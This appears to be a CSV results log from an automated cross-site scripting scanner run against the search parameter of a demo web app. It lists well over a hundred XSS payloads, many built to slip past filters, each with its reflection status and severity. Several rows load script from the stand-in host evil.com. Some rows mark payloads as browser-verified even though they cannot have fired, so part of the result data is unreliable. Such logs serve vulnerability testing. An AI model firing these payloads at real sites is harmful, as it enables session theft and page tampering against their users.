Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:58:58.939,2026-01-10 17:58:59.044,0.106,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.910,2026-01-10 17:58:59.052,0.142,https://demo-knsl.onrender.com/search,GET,q,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.949,2026-01-10 17:58:59.055,0.106,https://demo-knsl.onrender.com/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.955,2026-01-10 17:58:59.078,0.123,https://demo-knsl.onrender.com/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.966,2026-01-10 17:58:59.078,0.112,https://demo-knsl.onrender.com/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.952,2026-01-10 17:58:59.078,0.126,https://demo-knsl.onrender.com/search,GET,q,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.950,2026-01-10 17:58:59.080,0.131,https://demo-knsl.onrender.com/search,GET,q,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.042,2026-01-10 17:58:59.157,0.114,https://demo-knsl.onrender.com/search,GET,q,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.044,2026-01-10 17:58:59.157,0.112,https://demo-knsl.onrender.com/search,GET,q,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.953,2026-01-10 17:58:59.178,0.225,https://demo-knsl.onrender.com/search,GET,q,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.052,2026-01-10 17:58:59.179,0.126,https://demo-knsl.onrender.com/search,GET,q,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.055,2026-01-10 17:58:59.180,0.125,https://demo-knsl.onrender.com/search,GET,q,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.080,2026-01-10 17:58:59.184,0.103,https://demo-knsl.onrender.com/search,GET,q,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.078,2026-01-10 17:58:59.186,0.109,https://demo-knsl.onrender.com/search,GET,q,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.078,2026-01-10 17:58:59.189,0.111,https://demo-knsl.onrender.com/search,GET,q,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.078,2026-01-10 17:58:59.196,0.119,https://demo-knsl.onrender.com/search,GET,q,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.157,2026-01-10 17:58:59.264,0.108,https://demo-knsl.onrender.com/search,GET,q,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.157,2026-01-10 17:58:59.265,0.109,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.178,2026-01-10 17:58:59.291,0.112,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.189,2026-01-10 17:58:59.292,0.102,https://demo-knsl.onrender.com/search,GET,q,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.186,2026-01-10 17:58:59.295,0.109,https://demo-knsl.onrender.com/search,GET,q,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.180,2026-01-10 17:58:59.295,0.116,https://demo-knsl.onrender.com/search,GET,q,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.179,2026-01-10 17:58:59.297,0.119,https://demo-knsl.onrender.com/search,GET,q,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.184,2026-01-10 17:58:59.307,0.123,https://demo-knsl.onrender.com/search,GET,q,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.196,2026-01-10 17:58:59.308,0.112,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.264,2026-01-10 17:58:59.373,0.109,https://demo-knsl.onrender.com/search,GET,q,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.265,2026-01-10 17:58:59.377,0.112,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.291,2026-01-10 17:58:59.388,0.097,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.292,2026-01-10 17:58:59.397,0.105,https://demo-knsl.onrender.com/search,GET,q,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.295,2026-01-10 17:58:59.407,0.112,https://demo-knsl.onrender.com/search,GET,q,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.297,2026-01-10 17:58:59.407,0.110,https://demo-knsl.onrender.com/search,GET,q,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.295,2026-01-10 17:58:59.407,0.112,https://demo-knsl.onrender.com/search,GET,q,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.307,2026-01-10 17:58:59.418,0.111,https://demo-knsl.onrender.com/search,GET,q,<script>al\x65rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.308,2026-01-10 17:58:59.424,0.116,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.373,2026-01-10 17:58:59.474,0.101,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.418,2026-01-10 17:58:59.487,0.069,https://demo-knsl.onrender.com/search,GET,q,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,NO_REFLECTION,No,,Info
2026-01-10 17:58:59.377,2026-01-10 17:58:59.490,0.113,https://demo-knsl.onrender.com/search,GET,q,<script>[1].find(alert)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.388,2026-01-10 17:58:59.490,0.103,https://demo-knsl.onrender.com/search,GET,q,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.397,2026-01-10 17:58:59.511,0.114,https://demo-knsl.onrender.com/search,GET,q,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.407,2026-01-10 17:58:59.517,0.110,https://demo-knsl.onrender.com/search,GET,q,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.407,2026-01-10 17:58:59.518,0.111,https://demo-knsl.onrender.com/search,GET,q,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.407,2026-01-10 17:58:59.521,0.114,https://demo-knsl.onrender.com/search,GET,q,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.424,2026-01-10 17:58:59.532,0.107,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.474,2026-01-10 17:58:59.579,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.490,2026-01-10 17:58:59.595,0.105,https://demo-knsl.onrender.com/search,GET,q,<script	src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.490,2026-01-10 17:58:59.595,0.105,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.487,2026-01-10 17:58:59.606,0.118,https://demo-knsl.onrender.com/search,GET,q,<script/src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.518,2026-01-10 17:58:59.633,0.115,https://demo-knsl.onrender.com/search,GET,q,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.521,2026-01-10 17:58:59.633,0.112,https://demo-knsl.onrender.com/search,GET,q,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.511,2026-01-10 17:58:59.633,0.122,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.532,2026-01-10 17:58:59.642,0.110,https://demo-knsl.onrender.com/search,GET,q,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.517,2026-01-10 17:58:59.642,0.125,https://demo-knsl.onrender.com/search,GET,q,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.579,2026-01-10 17:58:59.695,0.116,https://demo-knsl.onrender.com/search,GET,q,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.949,2026-01-10 17:58:59.703,0.754,https://demo-knsl.onrender.com/search,GET,q,<html manifest=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:58:59.595,2026-01-10 17:58:59.708,0.113,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.595,2026-01-10 17:58:59.708,0.113,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.606,2026-01-10 17:58:59.716,0.110,https://demo-knsl.onrender.com/search,GET,q,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.633,2026-01-10 17:58:59.738,0.106,https://demo-knsl.onrender.com/search,GET,q,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.633,2026-01-10 17:58:59.746,0.113,https://demo-knsl.onrender.com/search,GET,q,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.642,2026-01-10 17:58:59.747,0.106,https://demo-knsl.onrender.com/search,GET,q,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.642,2026-01-10 17:58:59.756,0.115,https://demo-knsl.onrender.com/search,GET,q,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.738,2026-01-10 17:58:59.788,0.049,https://demo-knsl.onrender.com/search,GET,q,<input type=month onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-10 17:58:59.695,2026-01-10 17:58:59.810,0.115,https://demo-knsl.onrender.com/search,GET,q,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.703,2026-01-10 17:58:59.812,0.109,https://demo-knsl.onrender.com/search,GET,q,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.708,2026-01-10 17:58:59.822,0.114,https://demo-knsl.onrender.com/search,GET,q,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.708,2026-01-10 17:58:59.822,0.114,https://demo-knsl.onrender.com/search,GET,q,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.716,2026-01-10 17:58:59.824,0.108,https://demo-knsl.onrender.com/search,GET,q,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.788,2026-01-10 17:58:59.852,0.065,https://demo-knsl.onrender.com/search,GET,q,<input type=button onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
2026-01-10 17:58:59.747,2026-01-10 17:58:59.856,0.109,https://demo-knsl.onrender.com/search,GET,q,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.746,2026-01-10 17:58:59.859,0.113,https://demo-knsl.onrender.com/search,GET,q,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.756,2026-01-10 17:58:59.869,0.113,https://demo-knsl.onrender.com/search,GET,q,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.633,2026-01-10 17:58:59.882,0.249,https://demo-knsl.onrender.com/search,GET,q,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.822,2026-01-10 17:58:59.914,0.091,https://demo-knsl.onrender.com/search,GET,q,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,NO_REFLECTION,No,,Info
2026-01-10 17:58:59.852,2026-01-10 17:58:59.959,0.107,https://demo-knsl.onrender.com/search,GET,q,<keygen onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.812,2026-01-10 17:58:59.959,0.147,https://demo-knsl.onrender.com/search,GET,q,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.822,2026-01-10 17:58:59.968,0.146,https://demo-knsl.onrender.com/search,GET,q,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.824,2026-01-10 17:58:59.969,0.146,https://demo-knsl.onrender.com/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.869,2026-01-10 17:58:59.970,0.101,https://demo-knsl.onrender.com/search,GET,q,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.856,2026-01-10 17:58:59.970,0.113,https://demo-knsl.onrender.com/search,GET,q,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.859,2026-01-10 17:58:59.970,0.111,https://demo-knsl.onrender.com/search,GET,q,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.914,2026-01-10 17:58:59.972,0.059,https://demo-knsl.onrender.com/search,GET,q,<img crossorigin=anonymous src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:58:59.810,2026-01-10 17:58:59.975,0.165,https://demo-knsl.onrender.com/search,GET,q,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.882,2026-01-10 17:58:59.982,0.100,https://demo-knsl.onrender.com/search,GET,q,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.959,2026-01-10 17:59:00.030,0.071,https://demo-knsl.onrender.com/search,GET,q,<script crossorigin=anonymous src=x onerror=alert(1)></script>,NO_REFLECTION,No,,Info
2026-01-10 17:58:59.959,2026-01-10 17:59:00.088,0.129,https://demo-knsl.onrender.com/search,GET,q,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.969,2026-01-10 17:59:00.091,0.122,https://demo-knsl.onrender.com/search,GET,q,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.970,2026-01-10 17:59:00.092,0.122,https://demo-knsl.onrender.com/search,GET,q,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.970,2026-01-10 17:59:00.092,0.122,https://demo-knsl.onrender.com/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.968,2026-01-10 17:59:00.097,0.129,https://demo-knsl.onrender.com/search,GET,q,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.972,2026-01-10 17:59:00.097,0.125,https://demo-knsl.onrender.com/search,GET,q,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.970,2026-01-10 17:59:00.102,0.132,https://demo-knsl.onrender.com/search,GET,q,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.982,2026-01-10 17:59:00.104,0.123,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeked=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.975,2026-01-10 17:59:00.105,0.130,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeking=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.030,2026-01-10 17:59:00.128,0.099,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplaying=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.088,2026-01-10 17:59:00.190,0.102,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.091,2026-01-10 17:59:00.206,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpause=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.104,2026-01-10 17:59:00.212,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.092,2026-01-10 17:59:00.212,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.105,2026-01-10 17:59:00.212,0.107,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.092,2026-01-10 17:59:00.212,0.121,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.097,2026-01-10 17:59:00.216,0.118,https://demo-knsl.onrender.com/search,GET,q,<img src=x onended=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.102,2026-01-10 17:59:00.226,0.124,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.097,2026-01-10 17:59:00.226,0.128,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.128,2026-01-10 17:59:00.235,0.106,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.190,2026-01-10 17:59:00.296,0.106,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.212,2026-01-10 17:59:00.314,0.102,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.location)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.206,2026-01-10 17:59:00.316,0.110,https://demo-knsl.onrender.com/search,GET,q,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.212,2026-01-10 17:59:00.316,0.104,https://demo-knsl.onrender.com/search,GET,q,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.216,2026-01-10 17:59:00.326,0.110,https://demo-knsl.onrender.com/search,GET,q,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.226,2026-01-10 17:59:00.330,0.105,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.name)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.212,2026-01-10 17:59:00.331,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.212,2026-01-10 17:59:00.331,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.226,2026-01-10 17:59:00.333,0.107,https://demo-knsl.onrender.com/search,GET,q,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.235,2026-01-10 17:59:00.335,0.100,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.safari)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.316,2026-01-10 17:59:00.379,0.062,https://demo-knsl.onrender.com/search,GET,q,<acronym onmouseover=alert(1)>X</acronym>,NO_REFLECTION,No,,Info
2026-01-10 17:59:00.331,2026-01-10 17:59:00.394,0.062,https://demo-knsl.onrender.com/search,GET,q,<font onmouseover=alert(1)>X</font>,NO_REFLECTION,No,,Info
2026-01-10 17:59:00.296,2026-01-10 17:59:00.396,0.100,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.chrome)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.314,2026-01-10 17:59:00.423,0.109,https://demo-knsl.onrender.com/search,GET,q,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.316,2026-01-10 17:59:00.425,0.108,https://demo-knsl.onrender.com/search,GET,q,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.326,2026-01-10 17:59:00.427,0.101,https://demo-knsl.onrender.com/search,GET,q,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.332,2026-01-10 17:59:00.432,0.100,https://demo-knsl.onrender.com/search,GET,q,<frame onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.335,2026-01-10 17:59:00.442,0.107,https://demo-knsl.onrender.com/search,GET,q,<noframes onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.333,2026-01-10 17:59:00.442,0.109,https://demo-knsl.onrender.com/search,GET,q,<frameset onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.330,2026-01-10 17:59:00.442,0.111,https://demo-knsl.onrender.com/search,GET,q,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.394,2026-01-10 17:59:00.499,0.105,https://demo-knsl.onrender.com/search,GET,q,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.396,2026-01-10 17:59:00.509,0.113,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.423,2026-01-10 17:59:00.530,0.107,https://demo-knsl.onrender.com/search,GET,q,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.425,2026-01-10 17:59:00.530,0.106,https://demo-knsl.onrender.com/search,GET,q,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.427,2026-01-10 17:59:00.530,0.104,https://demo-knsl.onrender.com/search,GET,q,<script>if(1){alert(1)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.432,2026-01-10 17:59:00.546,0.114,https://demo-knsl.onrender.com/search,GET,q,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.442,2026-01-10 17:59:00.549,0.107,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.379,2026-01-10 17:59:00.560,0.181,https://demo-knsl.onrender.com/search,GET,q,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.442,2026-01-10 17:59:00.560,0.118,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.442,2026-01-10 17:59:00.560,0.118,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.499,2026-01-10 17:59:00.608,0.109,https://demo-knsl.onrender.com/search,GET,q,"<script>alert([1,2,3])</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.509,2026-01-10 17:59:00.635,0.125,https://demo-knsl.onrender.com/search,GET,q,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.530,2026-01-10 17:59:00.639,0.109,https://demo-knsl.onrender.com/search,GET,q,<script>alert((()=>1)())</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.530,2026-01-10 17:59:00.641,0.111,https://demo-knsl.onrender.com/search,GET,q,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.530,2026-01-10 17:59:00.643,0.113,https://demo-knsl.onrender.com/search,GET,q,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,Yes,alert,Critical
